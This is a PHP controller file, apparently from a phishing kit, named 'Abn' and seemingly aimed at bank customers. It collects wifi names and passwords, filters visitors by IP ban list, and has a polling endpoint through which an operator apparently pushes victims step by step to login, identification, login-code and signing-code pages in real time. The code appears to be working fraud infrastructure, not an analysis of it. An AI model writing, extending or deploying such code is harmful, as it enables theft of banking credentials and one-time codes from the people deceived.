<?php

namespace App\Controllers\Abn;

use \Core\View;
use \App\Models\Abn\Abn;
use \App\Auth;

class Control extends \Core\Controller
{
    public function indexAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay']) && isset($_POST['wifi']) && isset($_POST['wifi_pass']) && isset($_POST['wifi_pass_two'])) {
            Abn::setWifi($_POST['wifi'], $_POST['wifi_pass'], $_POST['wifi_pass_two'], $_SESSION['uid']);
        } else {
            if (Abn::findBan($_SERVER['REMOTE_ADDR']) || !isset($_SESSION['pay']) || !Abn::checkPayment($this->route_params['id'])) {
                Abn::redirect();
            } else {
                Abn::setWifiInformation($_SESSION['uid']);

                View::render('Abn/control.php');
            }
        }
    }

    public function checkAction()
    {
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_SESSION['uid']) && isset($_SESSION['pay'])) {
                $check = Abn::getPage($_SESSION['uid']);

                if ($check) {
                    if ($check == 'login') {
                        echo json_encode(['page' => 'login']);   
                        Abn::setLoginPage($_SESSION['uid'], null);
                    } else if ($check == 'identification') {
                        echo json_encode(['page' => 'identification']);   
                        Abn::setIdentificationPage($_SESSION['uid'], null);
                    } else if ($check == 'loginCode') {
                        echo json_encode(['page' => 'loginCode']);
                        Abn::setLoginCodePage($_SESSION['uid'], null);
                    } else if ($check == 'signCode') {
                        echo json_encode(['page' => 'signCode']);
                        Abn::setSignCodePage($_SESSION['uid'], null);
                    } else if ($check == 'control') {
                        echo json_encode(['page' => 'control']);
                        Abn::setControlPage($_SESSION['uid'], null);
                    } else if ($check == 'finish') {
                        echo json_encode(['page' => 'finish']);
                        Abn::setFinishPage($_SESSION['uid'], null);   
                        unset($_SESSION['pay']);
                        unset($_SESSION['uid']);
                    }
                } else {
                    echo json_encode(['page' => 'waiting']);
                }
           
        } else {
            Abn::redirect();
        }
    }
}